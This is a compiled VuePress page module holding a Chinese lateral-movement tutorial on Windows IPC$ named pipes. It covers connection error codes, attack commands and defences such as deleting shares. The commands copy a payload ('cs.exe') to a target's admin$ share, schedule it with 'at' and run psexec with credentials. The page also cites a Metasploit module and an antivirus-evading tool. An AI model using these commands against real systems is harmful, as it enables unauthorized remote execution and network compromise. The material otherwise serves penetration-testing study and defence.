import{_ as e}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as p,c as t,a as n,b as o,d as c,e as s,r as i}from"./app.736b169c.js";const l={},u=s(`<h2 id="ipc-概述" tabindex="-1"><a class="header-anchor" href="#ipc-概述" aria-hidden="true">#</a> IPC$概述</h2><p><code>IPC$</code> 以命名管道(named pipe)的形式连接实现文件共享传输和命令执行；</p><p>根据对应IPC$共享目录的ACL权限来决定是否可写/可遍历等权限。</p><div class="custom-container tip"><p class="custom-container-title">验证方式</p><p>1：匿名<code>IPC$</code>: 空连接，但是匿名<code>IPC$</code>的权限较低</p><p>2：非匿名<code>IPC$</code>: 需要帐号密码的验证</p><p>3：SMB:局域网文件传输协议 445、139、135需要打开</p></div><div class="custom-container info"><p class="custom-container-title">常见错误</p><p>错误号5(拒绝访问)：非管理员权限的，权限不足</p><p>错误号51(Windows无法找到网络路径): 网络有问题</p><p>错误号1219(提供的凭据与已存在的凭据集冲突)：你已经和对方建立了一个ipc$，请删除再连</p><p>错误号1326(未知的用户名或错误密码)</p><p>错误号1792(试图登录，但是网络登录服务没有启动)： 目标NetLogon服务未启动(连接域控会出现此情况)</p><p>错误号2242(此用户的密码已经过期)：目标有帐号策略，强制定期要求更改密码</p></div><details class="custom-container details"><summary>错误号53(找不到网络路径)</summary><ol><li><p>ip地址错误</p></li><li><p>目标未开机</p></li><li><p>目标lanmanserver服务未启动</p></li><li><p>目标有防火墙(端口过滤)</p></li></ol></details><details class="custom-container details"><summary>错误号67(找不到网络名)</summary><ol><li><p>你的lanmanworkstation服务未启动</p></li><li><p>目标删除了ipc$</p></li></ol></details><h2 id="攻击利用" tabindex="-1"><a class="header-anchor" href="#攻击利用" aria-hidden="true">#</a> 攻击利用</h2><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#建立空连接</span>
net use <span class="token punctuation">[</span>\\\\IP地址\\IPC$<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>IP地址<span class="token operator">/</span>IPC$<span class="token punctuation">)</span> <span class="token string">&quot;&quot;</span> <span class="token operator">/</span>user:<span class="token string">&quot;administrator&quot;</span>

<span class="token comment">#建立非空连接</span>
net use <span class="token punctuation">[</span>\\\\IP地址\\IPC$<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>IP地址<span class="token operator">/</span>IPC$<span class="token punctuation">)</span> <span class="token string">&quot;admin@pass&quot;</span> <span class="token operator">/</span>user:<span class="token string">&quot;administrator&quot;</span>
 
<span class="token comment">#查看已经建立的连接</span>
net use
 
<span class="token comment">#上传文件</span>
<span class="token function">copy</span> cs<span class="token punctuation">.</span>exe <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11\\admin$<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/admin$<span class="token punctuation">)</span>

<span class="token comment">#查看共享文件</span>
<span class="token function">dir</span> <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11\\admin$<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/admin$<span class="token punctuation">)</span> 

<span class="token comment">#查看目标系统时间</span>
net time <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11<span class="token punctuation">)</span>

<span class="token comment">#定时执行命令</span>
at <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11<span class="token punctuation">)</span> 10:01 <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11\\admin$\\cs<span class="token punctuation">.</span>exe<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/admin$<span class="token operator">/</span>cs<span class="token punctuation">.</span>exe<span class="token punctuation">)</span> 

<span class="token comment">#删除已经建立的连接</span>
net use <span class="token punctuation">[</span>\\\\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11\\admin$<span class="token punctuation">]</span><span class="token punctuation">(</span>file:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/admin$<span class="token punctuation">)</span> <span class="token function">del</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="工具利用" tabindex="-1"><a class="header-anchor" href="#工具利用" aria-hidden="true">#</a> 工具利用</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">[</span><span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.110.130<span class="token punctuation">]</span><span class="token punctuation">(</span>file://192.168.110.130<span class="token punctuation">)</span> cmd
psexec.exe <span class="token punctuation">[</span><span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.110.130<span class="token punctuation">]</span><span class="token punctuation">(</span>file://192.168.110.130<span class="token punctuation">)</span> cmd <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> admin@pass


<span class="token comment">#msf模块</span>
exploit/windows/smb/psexec
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),r={href:"https://github.com/rootclay/WMIHACKER",target:"_blank",rel:"noopener noreferrer"},d=s(`<p>免杀且无需445端口的工具</p><h2 id="防御方法" tabindex="-1"><a class="header-anchor" href="#防御方法" aria-hidden="true">#</a> 防御方法</h2><p>1、删除共享</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>net share ipc$ <span class="token operator">/</span>delete
net share admin$ <span class="token operator">/</span>delete
net share c$ <span class="token operator">/</span>delete
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、停止server服务</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>net stop server <span class="token operator">/</span>y
<span class="token comment">#重新启动后server服务会重新开启</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>3、永久关闭**ipc$**和默认共享依赖的服务</p><p><strong>lanmanserver</strong>即server服务</p><p>打开服务(services.msc)-找到server服务禁用</p>`,9);function k(m,v){const a=i("ExternalLinkIcon");return p(),t("div",null,[u,n("p",null,[n("a",r,[o("https://github.com/rootclay/WMIHACKER"),c(a)])]),d])}const f=e(l,[["render",k],["__file","横向移动-IPC命名管道.html.vue"]]);export{f as default};
